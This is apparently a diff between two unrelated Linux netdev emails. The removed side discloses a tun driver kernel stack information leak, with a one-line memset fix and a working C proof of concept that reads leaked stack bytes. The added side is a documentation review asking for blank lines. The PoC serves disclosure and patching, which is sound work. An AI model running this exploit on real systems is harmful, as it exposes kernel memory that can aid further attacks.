@@ -1,252 +1,249 @@
-Return-Path: <netdev+bounces-296182-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-296183-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by mail.lfdr.de with LMTP
-	id kaLGHPgFJWpoCwIAu9opvQ
-	(envelope-from <netdev+bounces-296182-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:47:36 +0200
+	id 7X7yL2YGJWqACwIAu9opvQ
+	(envelope-from <netdev+bounces-296183-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:49:26 +0200
 X-Original-To: lists+netdev@lfdr.de
-Received: from sto.lore.kernel.org (sto.lore.kernel.org [172.232.135.74])
-	by mail.lfdr.de (Postfix) with ESMTPS id 08D2E64EE45
-	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:47:36 +0200 (CEST)
+Received: from sin.lore.kernel.org (sin.lore.kernel.org [104.64.211.4])
+	by mail.lfdr.de (Postfix) with ESMTPS id C46CE64EE5E
+	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:49:25 +0200 (CEST)
 Authentication-Results: mail.lfdr.de;
-	dkim=pass header.d=asu.edu header.s=google header.b=aaTfNh4y;
-	spf=pass (mail.lfdr.de: domain of "netdev+bounces-296182-lists+netdev=lfdr.de@vger.kernel.org" designates 172.232.135.74 as permitted sender) smtp.mailfrom="netdev+bounces-296182-lists+netdev=lfdr.de@vger.kernel.org";
-	dmarc=pass (policy=none) header.from=asu.edu;
+	dkim=pass header.d=infradead.org header.s=bombadil.20210309 header.b=dnvXLX7w;
+	spf=pass (mail.lfdr.de: domain of "netdev+bounces-296183-lists+netdev=lfdr.de@vger.kernel.org" designates 104.64.211.4 as permitted sender) smtp.mailfrom="netdev+bounces-296183-lists+netdev=lfdr.de@vger.kernel.org";
+	dmarc=pass (policy=none) header.from=infradead.org;
 	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sto.lore.kernel.org (Postfix) with ESMTP id 4E686300C014
-	for <lists+netdev@lfdr.de>; Sun,  7 Jun 2026 05:47:35 +0000 (UTC)
+	by sin.lore.kernel.org (Postfix) with ESMTP id 28B6E3007AD5
+	for <lists+netdev@lfdr.de>; Sun,  7 Jun 2026 05:49:22 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 985D928688C;
-	Sun,  7 Jun 2026 05:47:32 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id C8A412DB7A3;
+	Sun,  7 Jun 2026 05:49:20 +0000 (UTC)
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-pl1-f173.google.com (mail-pl1-f173.google.com [209.85.214.173])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2376E4071C7
-	for <netdev@vger.kernel.org>; Sun,  7 Jun 2026 05:47:30 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 19A412853E9;
+	Sun,  7 Jun 2026 05:49:17 +0000 (UTC)
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1780811252; cv=none; b=G7SadDf1HxKCZsTmIcLn5zb6Qr2LsVQjXHAiM71qd8FH7Xdei4XTDMaPAw0gZlpVabvfVGYAFg5hxOGPxFUAoMqFMAcJH2xyHNTf4jhYY1/GB+DwOHSLtp0StgeCKRhioLaMBS7bb+UnlY2z4OIpI3PF4qci3PU5Q1KRj/Lhq3w=
+	t=1780811360; cv=none; b=OAJq9YH7aZ5NKdDZlrm1mjHDYrv8e7ol8XMkKxBwtbt2NA2seYc42RsNcN4N6TbGCAf6OcyacPBWZHKIRbciPeMiEU5aNSiVvWIMqu/f7TV6j4Xpro/cXXWQ74jqWKUuMVx86yKyAIU1U58W6oXlugeOQtlf2vsUfjmxH8DcAds=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1780811252; c=relaxed/simple;
-	bh=QT2Loc0Edw/Jx7OIIQXQMn1I5gRb253IW07qKN3VO0o=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=PEdugZeH2JTfgwNWIrWhPJGpYdmp9/QKKLX+AqPw8AJwb/V2YZOsOLjFZJDXm+uzvVfAD+AU+uB7hjeoDMBkoNZuOo+JQTpnWKh2cvVzYmtmp/oAC+zZGw1gxdYqbSIuBzKFuvCVhkOP5kq8FniIf69ISAViEyhqUX5ro9AjOIU=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=aaTfNh4y; arc=none smtp.client-ip=209.85.214.173
-Received: by mail-pl1-f173.google.com with SMTP id d9443c01a7336-2c0c379e8ffso21800335ad.3
-        for <netdev@vger.kernel.org>; Sat, 06 Jun 2026 22:47:30 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=asu.edu; s=google; t=1780811250; x=1781416050; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:mime-version:references:message-id
-         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
-        bh=HH2zvhwm+P9D3XVeeSt2250hPt28MK4EwTvB6hA2NNk=;
-        b=aaTfNh4y2wUZz0Z1bCH3azao6WRFHpW0/RfXlCORXQVGAy2ih64apujy6EicTepRlD
-         DcBNhcuuCyC++VJA4XPx195eev28lliXDjJrf6zfE7RgYQ1uI/SYl+44u/x5FqHHR6uH
-         CbZB2Z4cy5aUUKQX1/LlIwRfyC5Rvc8SbQRbMTRr3d0+gK+nq791ZEtluXD12n5kyGQ3
-         Sq/yyEkTAKCGLOoVt9swKM2y7paDJ8VPoKPR3NXImG++bydF/WXyJJVa6U+LSuy4hJ0T
-         N2+ujoEQaMzCV1iOmHzMkfcQVUMuFVm9kuN7nWVOpQTbC7pxAiuySLKSdd0c+ONjWaTv
-         J4Sw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1780811250; x=1781416050;
-        h=in-reply-to:content-disposition:mime-version:references:message-id
-         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
-         :subject:date:message-id:reply-to;
-        bh=HH2zvhwm+P9D3XVeeSt2250hPt28MK4EwTvB6hA2NNk=;
-        b=jhjhsxcdNEztlGEzds9U+9m5Jfaz9jnjTGgC4gBvUFA3LZefYYtj9B1CvpfxV0nkvl
-         CDZQZsh6+oyRAdS+zxsFOlAQHUDMOq7zneC12eGHJM0a7ofl0lf2y5q5ogFpDd5YMTHr
-         oWx6URbffJ9jYOGd7t64mnoxIyRuBO0xWigoMI+YbZ3lFRIqfYefP3WHW97Z48mk0Thy
-         h+CpZ6efIHU25Y5yxiXOKW1UfxoJRcFuX50hz3iaNgvwGC9yN8cxrUbxpQ6C1yVIouQ2
-         KQR1gVy0gzhlXT9rfDUjl6goJfVcIYBqpuehagdVOwGFfWw/ge2m645jZ3noxJAh3bBX
-         G5rg==
-X-Gm-Message-State: AOJu0YzCm41PGmo3g0B88IbFs2G+jBdtsjsdkKi0xm1q/aQG4j9Tb0Je
-	Ee6G+tRy1TbFPsRVU+nSSxAws5URta862GoazsATbAgo+1lPLowyNI2Gb6fOAqLwo4CCPxFGuXd
-	ec/Y8mA==
-X-Gm-Gg: Acq92OE4up0/n45cOHCBpS3G6dEU6a0fVpZKkvF/kAkubG1b8Y8TZnHy4xdfShbu4OZ
-	ABypDCfvmzmuiZo9hX1Oi4ibzjvtoPLxM7Yocakcp1YpAivSxyMUFlO9NLttyk0KkeVBrwP7M63
-	wN/+YMRAXl5GFAoZdb3Gndzg7YL527Ef4CIqavjKkFJSR4jBMNjVdxLLoIq2c4xQRSnSFbaot/Z
-	owFe4VvD0EtSNHFji1lyNFhR61M8ht6kQebV+pN6cmX2ga0M/LwlWYz5GKNOGq5R656sC1TR4dZ
-	zjqW6rzy7KBdEyszanAtWfRhg6P9KJN8hHbvpiJQ26aPH6F+dmkhx75o1S01J7SU+43tlLTUvQg
-	5GhpIDFfysWwBuEnuVv5EnKfgRp1mIhvLZSsagy6UdR0IDA9woNnbS1JUKeB1fI2jxRUUJliPgZ
-	9tyf5WgBrUdeNZ
-X-Received: by 2002:a17:902:f611:b0:2c0:b5c1:8e3e with SMTP id d9443c01a7336-2c1e78e4f03mr126729765ad.8.1780811250283;
-        Sat, 06 Jun 2026 22:47:30 -0700 (PDT)
-Received: from p1 ([73.140.210.38])
-        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2c164f6d2bbsm148733785ad.1.2026.06.06.22.47.29
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 06 Jun 2026 22:47:30 -0700 (PDT)
-Date: Sat, 6 Jun 2026 22:47:28 -0700
-From: Xiang Mei <xmei5@asu.edu>
-To: netdev@vger.kernel.org
-Cc: Willem de Bruijn <willemdebruijn.kernel@gmail.com>, 
-	Jason Wang <jasowang@redhat.com>, Paolo Abeni <pabeni@redhat.com>, 
-	Andrew Lunn <andrew+netdev@lunn.ch>, Eric Dumazet <edumazet@google.com>, 
-	Jakub Kicinski <kuba@kernel.org>, bestswngs@gmail.com
-Subject: Re: [PATCH net] tun: zero the whole vnet header in tun_put_user()
-Message-ID: <6y7bzuxolego45yjpjgw25zmyiioluixbjs2uiuqu7yfxaygaa@aozvxajlok4g>
-References: <20260607054428.3050243-1-xmei5@asu.edu>
+	s=arc-20240116; t=1780811360; c=relaxed/simple;
+	bh=uIzjOavKfaKb8A+vzifaV9lqqFBik5P++T7ZWM6BAyk=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=Cd57uTjavDDuCHSKErGsr6Ax5vd7lTNgYAFKYnztVtf0uyDZGjzqE3LihmTicJhuSK5r/vAHjlLwmEJsQ0T8tWGJN2h0lt8JT0pPQNShstwxsS4jVS2vK3XOTBQl1eiXYcqHdaoYARpZLstNv0dtSX348BCnb5QO5bgzO1nas2U=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=infradead.org; spf=pass smtp.mailfrom=infradead.org; dkim=pass (2048-bit key) header.d=infradead.org header.i=@infradead.org header.b=dnvXLX7w; arc=none smtp.client-ip=198.137.202.133
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=infradead.org; s=bombadil.20210309; h=Content-Transfer-Encoding:
+	Content-Type:In-Reply-To:From:References:Cc:To:Subject:MIME-Version:Date:
+	Message-ID:Sender:Reply-To:Content-ID:Content-Description;
+	bh=7gO0UdD5vwxsvPbPXQOY8CU6VnCOXDgqC4KB2RZA/yc=; b=dnvXLX7w9zqkZtiR4Pl+7mJpyw
+	vveBWG1NGSgCCVySw/omqLo3XsZ12cEcpGLao58K88QzIPLIV2Pj+JRD47zSGY8XB5Lfdzzv2GUhO
+	d4uaD8HRZY/c0OIDRkIwHh7B9PHVU4367hivDfE9COUwtD4q1mnNoasGop1kF0cyWOinn3KNDAgkS
+	/LfL+svckxrbZzGb28wR3XdTQ1g+IHJjDEedxi2/1latWxI0F65+i4TVQXEfzVnMZkhh92GF13MXA
+	Rcct45/Z+tYWII8ZQCOebYJdKbwqIOYRJWlBBpUrI9CoDqRZHGDIViGMZO4e5BTA5UGT94sX09s/Z
+	tSj387gw==;
+Received: from [50.53.43.113] (helo=[192.168.254.34])
+	by bombadil.infradead.org with esmtpsa (Exim 4.99.1 #2 (Red Hat Linux))
+	id 1wW6Ng-000000022zW-3Z1Q;
+	Sun, 07 Jun 2026 05:49:08 +0000
+Message-ID: <cf3d6937-1ffa-4d81-8e19-b3f607a7e1d1@infradead.org>
+Date: Sat, 6 Jun 2026 22:49:06 -0700
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20260607054428.3050243-1-xmei5@asu.edu>
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH net-next v4 16/16] Documentation: networking: Add
+ timestamp related APIs to OA TC6 framework
+To: Selvamani.Rajagopal@onsemi.com, Andrew Lunn <andrew@lunn.ch>,
+ Piergiorgio Beruto <pier.beruto@onsemi.com>,
+ Heiner Kallweit <hkallweit1@gmail.com>, Russell King
+ <linux@armlinux.org.uk>, "David S. Miller" <davem@davemloft.net>,
+ Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
+ Paolo Abeni <pabeni@redhat.com>, Andrew Lunn <andrew+netdev@lunn.ch>,
+ Parthiban Veerasooran <parthiban.veerasooran@microchip.com>,
+ Richard Cochran <richardcochran@gmail.com>, Rob Herring <robh@kernel.org>,
+ Krzysztof Kozlowski <krzk+dt@kernel.org>, Conor Dooley
+ <conor+dt@kernel.org>, Simon Horman <horms@kernel.org>,
+ Jonathan Corbet <corbet@lwn.net>, Shuah Khan <skhan@linuxfoundation.org>
+Cc: netdev@vger.kernel.org, linux-kernel@vger.kernel.org,
+ devicetree@vger.kernel.org, linux-doc@vger.kernel.org,
+ Jerry Ray <jerry.ray@microchip.com>
+References: <20260605-s2500-mac-phy-support-v4-0-de0fbc13c6d8@onsemi.com>
+ <20260605-s2500-mac-phy-support-v4-16-de0fbc13c6d8@onsemi.com>
+Content-Language: en-US
+From: Randy Dunlap <rdunlap@infradead.org>
+In-Reply-To: <20260605-s2500-mac-phy-support-v4-16-de0fbc13c6d8@onsemi.com>
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
 X-Rspamd-Action: no action
-X-Spamd-Result: default: False [-0.16 / 15.00];
+X-Spamd-Result: default: False [-0.66 / 15.00];
 	SUSPICIOUS_RECIPS(1.50)[];
 	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
-	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
-	MID_RHS_NOT_FQDN(0.50)[];
-	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
-	R_SPF_ALLOW(-0.20)[+ip4:172.232.135.74];
+	DMARC_POLICY_ALLOW(-0.50)[infradead.org,none];
+	R_DKIM_ALLOW(-0.20)[infradead.org:s=bombadil.20210309];
+	R_SPF_ALLOW(-0.20)[+ip4:104.64.211.4:c];
 	MAILLIST(-0.15)[generic];
 	MIME_GOOD(-0.10)[text/plain];
 	HAS_LIST_UNSUB(-0.01)[];
-	FREEMAIL_CC(0.00)[gmail.com,redhat.com,lunn.ch,google.com,kernel.org];
-	TAGGED_FROM(0.00)[bounces-296182-lists,netdev=lfdr.de];
+	TAGGED_FROM(0.00)[bounces-296183-lists,netdev=lfdr.de];
+	RCVD_COUNT_THREE(0.00)[4];
 	RCVD_TLS_LAST(0.00)[];
-	FROM_HAS_DN(0.00)[];
-	FORGED_SENDER(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
+	FREEMAIL_TO(0.00)[onsemi.com,lunn.ch,gmail.com,armlinux.org.uk,davemloft.net,google.com,kernel.org,redhat.com,microchip.com,lwn.net,linuxfoundation.org];
+	FORGED_SENDER(0.00)[rdunlap@infradead.org,netdev@vger.kernel.org];
+	RCPT_COUNT_TWELVE(0.00)[23];
+	FORGED_RECIPIENTS(0.00)[m:Selvamani.Rajagopal@onsemi.com,m:andrew@lunn.ch,m:pier.beruto@onsemi.com,m:hkallweit1@gmail.com,m:linux@armlinux.org.uk,m:davem@davemloft.net,m:edumazet@google.com,m:kuba@kernel.org,m:pabeni@redhat.com,m:andrew+netdev@lunn.ch,m:parthiban.veerasooran@microchip.com,m:richardcochran@gmail.com,m:robh@kernel.org,m:krzk+dt@kernel.org,m:conor+dt@kernel.org,m:horms@kernel.org,m:corbet@lwn.net,m:skhan@linuxfoundation.org,m:netdev@vger.kernel.org,m:linux-kernel@vger.kernel.org,m:devicetree@vger.kernel.org,m:linux-doc@vger.kernel.org,m:jerry.ray@microchip.com,m:krzk@kernel.org,m:conor@kernel.org,s:lists@lfdr.de];
 	MIME_TRACE(0.00)[0:+];
-	FORGED_RECIPIENTS(0.00)[m:netdev@vger.kernel.org,m:willemdebruijn.kernel@gmail.com,m:jasowang@redhat.com,m:pabeni@redhat.com,m:andrew+netdev@lunn.ch,m:edumazet@google.com,m:kuba@kernel.org,m:bestswngs@gmail.com,m:willemdebruijnkernel@gmail.com,m:andrew@lunn.ch,s:lists@lfdr.de];
-	FORWARDED(0.00)[lists@lfdr.de];
 	FORGED_SENDER_MAILLIST(0.00)[];
-	DKIM_TRACE(0.00)[asu.edu:+];
-	MISSING_XM_UA(0.00)[];
+	FORWARDED(0.00)[lists@lfdr.de];
+	FROM_HAS_DN(0.00)[];
+	FORGED_RECIPIENTS_MAILLIST(0.00)[];
 	TO_DN_SOME(0.00)[];
 	FORGED_SENDER_FORWARDING(0.00)[];
-	RCVD_COUNT_FIVE(0.00)[5];
-	PRECEDENCE_BULK(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
-	FORGED_RECIPIENTS_MAILLIST(0.00)[];
 	ALIAS_RESOLVED(0.00)[];
+	PRECEDENCE_BULK(0.00)[];
+	FROM_NEQ_ENVFROM(0.00)[rdunlap@infradead.org,netdev@vger.kernel.org];
+	DKIM_TRACE(0.00)[infradead.org:+];
+	MID_RHS_MATCH_FROM(0.00)[];
+	TAGGED_RCPT(0.00)[netdev,dt];
 	FORGED_RECIPIENTS_FORWARDING(0.00)[];
-	ASN(0.00)[asn:63949, ipnet:172.232.128.0/19, country:SG];
-	RCPT_COUNT_SEVEN(0.00)[8];
+	ASN(0.00)[asn:63949, ipnet:104.64.192.0/19, country:SG];
 	RCVD_VIA_SMTP_AUTH(0.00)[];
-	TAGGED_RCPT(0.00)[netdev];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[asu.edu:dkim,asu.edu:from_mime,asu.edu:email,sto.lore.kernel.org:helo,sto.lore.kernel.org:rdns]
+	DBL_BLOCKED_OPENRESOLVER(0.00)[vger.kernel.org:from_smtp,infradead.org:mid,infradead.org:from_mime,infradead.org:dkim,onsemi.com:email,sin.lore.kernel.org:helo,sin.lore.kernel.org:rdns]
 X-Rspamd-Server: lfdr
-X-Rspamd-Queue-Id: 08D2E64EE45
+X-Rspamd-Queue-Id: C46CE64EE5E
 
-On Sat, Jun 06, 2026 at 10:44:28PM -0700, Xiang Mei wrote:
-> tun_put_user() declares an on-stack struct virtio_net_hdr_v1_hash_tunnel
-> without zeroing it. For a non-tunnel skb, virtio_net_hdr_tnl_from_skb()
-> only initializes the first 10 bytes (sizeof(struct virtio_net_hdr)),
-> leaving bytes 10..23 (num_buffers and the hash/tunnel fields) as stack
-> garbage.
+Hi,
+These needs a few additional blank lines to avoid docs build warnings:
+
+Documentation/networking/oa-tc6-framework.rst:554: WARNING: Explicit markup ends without a blank line; unexpected unindent. [docutils]
+Documentation/networking/oa-tc6-framework.rst:561: WARNING: Explicit markup ends without a blank line; unexpected unindent. [docutils]
+Documentation/networking/oa-tc6-framework.rst:566: WARNING: Explicit markup ends without a blank line; unexpected unindent. [docutils]
+Documentation/networking/oa-tc6-framework.rst:573: WARNING: Explicit markup ends without a blank line; unexpected unindent. [docutils]
+
+See below.
+
+
+On 6/5/26 10:42 PM, Selvamani Rajagopal via B4 Relay wrote:
+> From: Selvamani Rajagopal <Selvamani.Rajagopal@onsemi.com>
 > 
-> An unprivileged user can set the vnet header size to 24 with
-> TUNSETVNETHDRSZ, so __tun_vnet_hdr_put() copies all 24 bytes of the
-> partially-initialized struct to userspace, leaking 14 bytes of kernel
-> stack on every read of a non-tunnel packet.
+> Added new APIs to support hardware timestamp feature as defined in
+> OPEN Alliance 10BASE-T1x MAC-PHY serial interface specification.
 > 
-> Fix it the same way tun_get_user() already does by zeroing the whole
-> header right after declaration.
-> 
-> Fixes: 288f30435132 ("tun: enable gso over UDP tunnel support.")
-> Reported-by: Weiming Shi <bestswngs@gmail.com>
-> Assisted-by: Claude:claude-opus-4-8
-> Signed-off-by: Xiang Mei <xmei5@asu.edu>
+> Signed-off-by: Selvamani Rajagopal <Selvamani.Rajagopal@onsemi.com>
 > ---
->  drivers/net/tun.c | 1 +
->  1 file changed, 1 insertion(+)
+>  Documentation/networking/oa-tc6-framework.rst | 76 +++++++++++++++++++++++++++
+>  1 file changed, 76 insertions(+)
 > 
-> diff --git a/drivers/net/tun.c b/drivers/net/tun.c
-> index 9e7744eb57a3..fed9dfdfcc3b 100644
-> --- a/drivers/net/tun.c
-> +++ b/drivers/net/tun.c
-> @@ -2070,6 +2070,7 @@ static ssize_t tun_put_user(struct tun_struct *tun,
->  		struct virtio_net_hdr_v1_hash_tunnel hdr;
->  		struct virtio_net_hdr *gso;
+> diff --git a/Documentation/networking/oa-tc6-framework.rst b/Documentation/networking/oa-tc6-framework.rst
+> index fe2aabde923a..694d9485b1c5 100644
+> --- a/Documentation/networking/oa-tc6-framework.rst
+> +++ b/Documentation/networking/oa-tc6-framework.rst
+> @@ -153,6 +153,10 @@ OPEN Alliance TC6 Framework
+>  - Forwards the received Ethernet frame from 10Base-T1x MAC-PHY to n/w
+>    subsystem.
 >  
-> +		memset(&hdr, 0, sizeof(hdr));
->  		ret = tun_vnet_hdr_tnl_from_skb(tun->flags, tun->dev, skb,
->  						&hdr);
->  		if (ret)
-> -- 
-> 2.43.0
->
-Thanks for your attention to this bug. Here are some information to
-reproduce it.
+> +- If supported by the hardware and enabled, updates hardware timestamp
+> +  in skb, when indicated by one of the three timestamp capture registers
+> +  through TSC fields of the header.
+> +
+>  Data Transaction
+>  ~~~~~~~~~~~~~~~~
+>  
+> @@ -495,3 +499,75 @@ the MAC-PHY.
+>  Zero align receive frame feature can be enabled to align all receive ethernet
+>  frames data to start at the beginning of any receive data chunk payload with a
+>  start word offset (SWO) of zero.
+> +
+> +.. c:function:: int oa_tc6_ptp_register(struct oa_tc6 *tc6, \
+> +                                        struct ptp_clock_info *info);
+> +
+> +Registers the PTP hardware clock related functions with the kernel.
+> +This API simply registers. Initialization of the fields in the
+> +ptp_clock_info structure are left to the vendor as programming hardware
+> +timer is expected to be vendor dependent. The fields max_adj, owner,
+> +and all the functions for the clock operations, like adjfine, gettimex64,
+> +settime64, adjtime are expected to be initialized in the structure before
+> +calling the registering the hardware clock.
+> +
+> +.. c:function:: void oa_tc6_ptp_unregister(struct oa_tc6 *tc6);
+> +
+> +Unregisters the PTP hardware clock related callbacks.
+> +
+> +.. c:function:: int oa_tc6_ioctl(struct oa_tc6 *tc6, struct ifreq *rq, \
+> +                                 int cmd);
+> +
+> +ioctl interface to handle hardware timestamp and PHY related commands.
+> +
+> +.. c:function:: int oa_tc6_get_ts_info(struct oa_tc6 *tc6, \
+> +                                       struct kernel_ethtool_ts_info *info);
+> +
+> +Provides timestamp related settings that are supported to ethtool.
+> +
+> +.. c:function:: void oa_tc6_hwtstamp_get(struct oa_tc6 *tc6, \
+> +                                         struct kernel_hwtstamp_config *cfg);
+> +
+> +Returns hardware timestamp configuration. Part of net_device_ops callbacks.
+> +
+> +.. c:function:: void oa_tc6_get_ts_stats(struct oa_tc6 *tc6, \
+> +                                         struct ethtool_ts_stats *ts_stats);
+> +
+> +Provides hardware timestamp related traffic statistics for ethtool.
+> +
+> +.. c:function:: int oa_tc6_hwtstamp_set(struct oa_tc6 *tc6, \
+> +                                         struct kernel_hwtstamp_config *cfg);
+> +
+> +Helper to set hardware timestamp configuration. Part of net_device_ops
+> +callbacks.
+> +
+> +.. c:function:: void oa_tc6_set_vend1_mms(struct oa_tc6 *tc6, int mms);
+> +
+> +Helper to map MDIO_MMD_VEND1 command to vendor specific Memory Map Select
+> +(MMS) value. This function offers flexibility for vendors that may have
+> +used any MMS value between 10 and 15 as allowed by the specification.
+> +MDIO_MMD_VEND2 is already mapped to MMS4 in the OA TC6 frame work code.
+> +
+> +.. c:function:: int oa_tc6_write_registers_mms(struct oa_tc6 *tc6, \
+> +                                               u16 address, u16 mms, \
+> +                                               u32 value[], u8 length);
 
-Configs:
-```
-CONFIG_TUN=y
-CONFIG_INIT_STACK_ALL_ZERO=n
-```
+Insert blank line here.
 
-PoC:
-```c
-// PoC: kernel stack info leak in tun_put_user via uninitialized
-// virtio_net_hdr_v1_hash_tunnel fields. drivers/net/tun.c
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <net/if.h>
-#include <linux/if_tun.h>
-#include <sys/ioctl.h>
-#include <arpa/inet.h>
+> +Writing multiple consecutive registers starting from @address for the
+> +given @mms memory map selector in the MAC-PHY. Maximum of 128 consecutive
+> +registers can be written starting at @address.
+> +
+> +.. c:function:: int oa_tc6_write_register_mms(struct oa_tc6 *tc6, \
+> +                                              u16 address, u16 mms, \
+> +                                              u32 value);
 
-#define TUN_F_UDP_TUNNEL_GSO 0x080
+and here.
 
-int main(void)
-{
-    int fd = open("/dev/net/tun", O_RDWR);
-    struct ifreq ifr = { .ifr_flags = IFF_TUN | IFF_NO_PI | IFF_VNET_HDR };
-    strcpy(ifr.ifr_name, "tun0");
-    ioctl(fd, TUNSETIFF, &ifr);
+> +Write a single register addressed by @address and @mms in the MAC-PHY.
+> +
+> +.. c:function:: int oa_tc6_read_registers_mms(struct oa_tc6 *tc6, \
+> +                                              u16 address, u16 mms, \
+> +                                              u32 value[], u8 length);
+and here.
 
-    int sz = 24;
-    ioctl(fd, TUNSETVNETHDRSZ, &sz);
-    ioctl(fd, TUNSETOFFLOAD, TUN_F_CSUM | TUN_F_TSO4 | TUN_F_TSO6 | TUN_F_UDP_TUNNEL_GSO);
+> +Reading multiple consecutive registers starting from @address for the
+> +given @mms memory map selector value, in the MAC-PHY. Maximum of 128
+> +consecutive registers can be read starting at @address.
+> +
+> +.. c:function:: int oa_tc6_read_register_mms(struct oa_tc6 *tc6, \
+> +                                             u16 address, u16 mms, \
+> +                                             u32 *value);
 
-    // bring tun0 up with 10.99.0.1/24 so a UDP packet routes into it
-    int s = socket(AF_INET, SOCK_DGRAM, 0);
-    struct sockaddr_in *a = (void *)&ifr.ifr_addr;
-    a->sin_family = AF_INET;
-    a->sin_addr.s_addr = inet_addr("10.99.0.1");
-    ioctl(s, SIOCSIFADDR, &ifr);
-    a->sin_addr.s_addr = inet_addr("255.255.255.0");
-    ioctl(s, SIOCSIFNETMASK, &ifr);
-    ioctl(s, SIOCGIFFLAGS, &ifr);
-    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
-    ioctl(s, SIOCSIFFLAGS, &ifr);
+and here.
 
-    // send a UDP packet that gets routed out through tun0
-    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(1234),
-                               .sin_addr.s_addr = inet_addr("10.99.0.2") };
-    char pkt[128];
-    memset(pkt, 0x41, sizeof(pkt));
-    sendto(s, pkt, sizeof(pkt), 0, (void *)&dst, sizeof(dst));
+> +Read a single register addressed by @address and @mms in the MAC-PHY.
+> 
 
-    // read it back; bytes 10..23 of the vnet hdr should be zero but leak stack
-    unsigned char buf[4096];
-    for (int i = 0; i < 200; i++) {
-        sendto(s, pkt, sizeof(pkt), 0, (void *)&dst, sizeof(dst));
-        ssize_t n = read(fd, buf, sizeof(buf));
-        if (n < sz) continue;
-        int leak = 0;
-        for (int j = 10; j < 24; j++) leak |= buf[j];
-        if (!leak) continue;
-        printf("[+] leak: ");
-        for (int j = 10; j < 24; j++) printf("%02x ", buf[j]);
-        printf("\n");
-        return 0;
-    }
-    printf("[-] no leak observed\n");
-    return 1;
-}
-```
-
-Let me know if you have any questions about this bug.
-
-Xiang
-
+-- 
+~Randy
 
 
